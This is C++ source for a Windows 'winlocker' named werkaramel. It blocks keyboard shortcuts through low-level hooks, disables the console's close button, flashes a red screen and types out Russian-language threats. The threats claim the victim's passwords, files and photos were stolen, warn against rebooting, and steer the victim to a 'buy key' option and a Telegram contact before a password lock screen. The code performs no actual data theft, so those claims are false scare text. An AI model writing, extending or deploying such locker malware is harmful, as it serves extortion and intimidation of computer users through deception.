// language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
// werkaramel — single console, all phases, no fullscreen tricks
#include <windows.h>
#include <string>
#include <thread>
#include <chrono>
#include <random>

const std::wstring PASS = L"123";

HHOOK g_kbHook = nullptr;
HANDLE g_hOut = INVALID_HANDLE_VALUE;
HANDLE g_hIn = INVALID_HANDLE_VALUE;
HWND g_hCon = nullptr;
std::wstring g_input;
std::mt19937 g_rng(std::random_device{}());

int RandInt(int lo, int hi) {
    std::uniform_int_distribution<int> d(lo, hi);
    return d(g_rng);
}

const std::wstring SCENE_TEXT =
    L"не пытайтесь что-то сделать сейчас. будет хуже.\n"
    L"\n"
    L"вы скачали winlocker werkaramel. это не игрушка.\n"
    L"уже поздно. всё что нужно — сделано.\n"
    L"\n"
    L"все ваши данные скопированы. пароли, файлы, фото, переписки.\n"
    L"всё это уже на нашем сервере.\n"
    L"\n"
    L"не выключайте компьютер. не трогайте диспетчер задач.\n"
    L"не пытайтесь снять задачу. система отслеживает любые действия.\n"
    L"\n"
    L"попытка закрыть это окно = немедленная блокировка.\n"
    L"попытка перезагрузить = потеря данных навсегда.\n"
    L"\n"
    L"оставайтесь на месте. дальнейшие инструкции появятся ниже.";

void WOut(const std::wstring& s) {
    DWORD w = 0;
    WriteConsoleW(g_hOut, s.c_str(), (DWORD)s.size(), &w, nullptr);
}
void SetColor(WORD attr) { SetConsoleTextAttribute(g_hOut, attr); }
void ClearScreen(WORD bg = 0) {
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD cells, w;
    COORD home = {0, 0};
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    cells = csbi.dwSize.X * csbi.dwSize.Y;
    FillConsoleOutputCharacterW(g_hOut, L' ', cells, home, &w);
    FillConsoleOutputAttribute(g_hOut, bg, cells, home, &w);
    SetConsoleCursorPosition(g_hOut, home);
}
void Gotoxy(int x, int y) {
    COORD c{ (SHORT)x, (SHORT)y };
    SetConsoleCursorPosition(g_hOut, c);
}

BOOL WINAPI CtrlHandler(DWORD type) {
    if (type == CTRL_C_EVENT) return TRUE;
    return FALSE;
}

// просто растягиваем консоль на весь экран — БЕЗ убирания рамки
void MaximizeConsole() {
    // большой буфер
    COORD size = {200, 80};
    SetConsoleScreenBufferSize(g_hOut, size);

    // маленькое окно
    SMALL_RECT small = {0, 0, 1, 1};
    SetConsoleWindowInfo(g_hOut, TRUE, &small);

    // растянуть окно на весь экран
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(g_hCon, HWND_TOP, 0, 0, sw, sh, SWP_SHOWWINDOW);

    // показать окно нормально
    ShowWindow(g_hCon, SW_SHOWNORMAL);
    SetForegroundWindow(g_hCon);

    // финальный размер буфера под окно
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    COORD bufSize = {200, csbi.dwSize.Y};
    SetConsoleScreenBufferSize(g_hOut, bufSize);

    // шрифт
    CONSOLE_FONT_INFOEX cfi{};
    cfi.cbSize = sizeof(cfi);
    cfi.dwFontSize.Y = 18;
    cfi.dwFontSize.X = 9;
    wcscpy_s(cfi.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);

    // скрыть системное меню (крестик станет серым)
    HMENU menu = GetSystemMenu(g_hCon, FALSE);
    if (menu) {
        DeleteMenu(menu, SC_CLOSE, MF_BYCOMMAND);
    }
    SetConsoleCtrlHandler(CtrlHandler, TRUE);
}

LRESULT CALLBACK BlockHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION) {
        auto* kb = (KBDLLHOOKSTRUCT*)lp;
        DWORD vk = kb->vkCode;
        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_ESCAPE) return 1;
        if (vk == VK_F11) return 1;
    }
    return CallNextHookEx(nullptr, code, wp, lp);
}

LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION) return 1;
    return CallNextHookEx(nullptr, code, wp, lp);
}

// ФАЗА 1: красный flash
void PhaseRed() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                 GetModuleHandleW(nullptr), 0);

    for (int i = 0; i < 12; ++i) {
        ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
        ClearScreen(0);
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
    }

    ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int cols = csbi.dwSize.X, rows = csbi.dwSize.Y;
    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    std::wstring txt = L"В А С   З А М Е Т И Л И";
    Gotoxy((cols - (int)txt.size()) / 2, rows / 2);
    WOut(txt);
    std::this_thread::sleep_for(std::chrono::seconds(1));

    UnhookWindowsHookEx(g_kbHook);
    g_kbHook = nullptr;
}

// ФАЗА 2: красные правила
void PhaseRules() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                 GetModuleHandleW(nullptr), 0);

    ClearScreen(0);
    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    Gotoxy(2, 2);

    int col = 2, row = 2;
    for (size_t i = 0; i < SCENE_TEXT.size(); ++i) {
        wchar_t c = SCENE_TEXT[i];
        if (c == L'\n') { col = 2; row++; Gotoxy(col, row); }
        else { WOut(std::wstring(1, c)); col++; }
        std::this_thread::sleep_for(std::chrono::milliseconds(35));
    }

    std::this_thread::sleep_for(std::chrono::seconds(5));
    UnhookWindowsHookEx(g_kbHook);
    g_kbHook = nullptr;
}

// ФАЗА 3: зелёное меню
const wchar_t* BANNER[] = {
    L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
    L"██║    ██║██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗████╗ ████║██╔════╝██║",
    L"██║ █╗ ██║█████╗  ██████╔╝█████╔╝ ███████║██████╔╝███████║██╔████╔██║█████╗  ██║",
    L"██║███╗██║██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║",
    L"╚███╔███╔╝███████╗██║  ██║██║  ██╗██║  ██║██║  ██║██║  ██║██║ ╚═╝ ██║███████╗███████╗",
    L" ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝",
};

void PrintMenu() {
    ClearScreen(0);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(g_hOut, &csbi);
    int rows = csbi.dwSize.Y;

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    for (int i = 0; i < 6; ++i) {
        Gotoxy(2, 1 + i);
        WOut(BANNER[i]);
    }

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, 8);
    WOut(L"                        W I N L O C K E R");

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(2, 10);
    std::wstring line(78, L'─');
    WOut(line);

    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    Gotoxy(4, 12); WOut(L"Выберите действие:");

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(4, 14); WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
    Gotoxy(4, 15); WOut(L"[ 2 ]   Купить ключ");
    Gotoxy(4, 16); WOut(L"[ 3 ]   Выйти");

    SetColor(FOREGROUND_GREEN);
    Gotoxy(4, rows - 4); WOut(L"введите число и нажмите Enter");

    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Gotoxy(4, rows - 2); WOut(L"> ");
    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    WOut(g_input + L"  ");
}

void PhaseMenu() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                 GetModuleHandleW(nullptr), 0);

    PrintMenu();

    INPUT_RECORD rec;
    DWORD read = 0;

    while (true) {
        if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
            continue;
        }
        if (rec.EventType != KEY_EVENT) continue;
        if (!rec.Event.KeyEvent.bKeyDown) continue;

        wchar_t c = rec.Event.KeyEvent.uChar.UnicodeChar;
        if (c == 0) continue;

        if (c >= L'0' && c <= L'9') {
            g_input += c;
            PrintMenu();
        } else if (c == L'\b') {
            if (!g_input.empty()) g_input.pop_back();
            PrintMenu();
        } else if (c == L'\r') {
            if (g_input == L"1" || g_input == L"2" || g_input == L"3") {
                UnhookWindowsHookEx(g_kbHook);
                g_kbHook = nullptr;
                return;
            } else {
                g_input.clear();
                PrintMenu();
            }
        }
    }
}

// ФАЗА 4: WinLocker в консоли
void PhaseLocker() {
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                 GetModuleHandleW(nullptr), 0);

    g_input.clear();
    bool wrong = false;

    while (true) {
        ClearScreen(0);
        CONSOLE_SCREEN_BUFFER_INFO csbi;
        GetConsoleScreenBufferInfo(g_hOut, &csbi);
        int cols = csbi.dwSize.X;
        int rows = csbi.dwSize.Y;

        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::wstring logo = L"W E R K A R A M E L";
        Gotoxy((cols - (int)logo.size()) / 2, 3); WOut(logo);

        std::wstring locked = L"S Y S T E M   L O C K E D";
        Gotoxy((cols - (int)locked.size()) / 2, 6); WOut(locked);

        SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        std::wstring hint = L"введите пароль для разблокировки:";
        Gotoxy((cols - (int)hint.size()) / 2, 9); WOut(hint);

        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::wstring tg = L"tg: @werkaramel";
        Gotoxy((cols - (int)tg.size()) / 2, 11); WOut(tg);

        // строка ввода
        SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
        Gotoxy(4, rows - 2);
        std::wstring masked(g_input.size(), L'*');
        WOut(L"> " + masked + L"_");

        if (wrong) {
            SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
            std::wstring err = L"неверный пароль";
            Gotoxy((cols - (int)err.size()) / 2, 14); WOut(err);
        }

        INPUT_RECORD rec;
        DWORD read = 0;

        bool next = false;
        while (!next) {
            if (!ReadConsoleInputW(g_hIn, &rec, 1, &read)) {
                std::this_thread::sleep_for(std::chrono::milliseconds(30));
                continue;
            }
            if (rec.EventType != KEY_EVENT) continue;
            if (!rec.Event.KeyEvent.bKeyDown) continue;

            wchar_t c = rec.Event.KeyEvent.uChar.UnicodeChar;
            if (c == 0) continue;

            if (c == L'\b') {
                if (!g_input.empty()) g_input.pop_back();
                wrong = false;
                next = true;
            } else if (c == L'\r') {
                if (g_input == PASS) {
                    UnhookWindowsHookEx(g_kbHook);
                    g_kbHook = nullptr;
                    return;
                } else {
                    g_input.clear();
                    wrong = true;
                    next = true;
                }
            } else if (c >= 32) {
                g_input.push_back(c);
                wrong = false;
                next = true;
            }
        }
    }
}

int wmain() {
    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    g_hIn = GetStdHandle(STD_INPUT_HANDLE);
    g_hCon = GetConsoleWindow();
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    DWORD mode = 0;
    GetConsoleMode(g_hIn, &mode);
    SetConsoleMode(g_hIn, mode | ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT | ENABLE_PROCESSED_INPUT);

    MaximizeConsole();

    PhaseRed();
    PhaseRules();
    PhaseMenu();
    PhaseLocker();

    return 0;
}
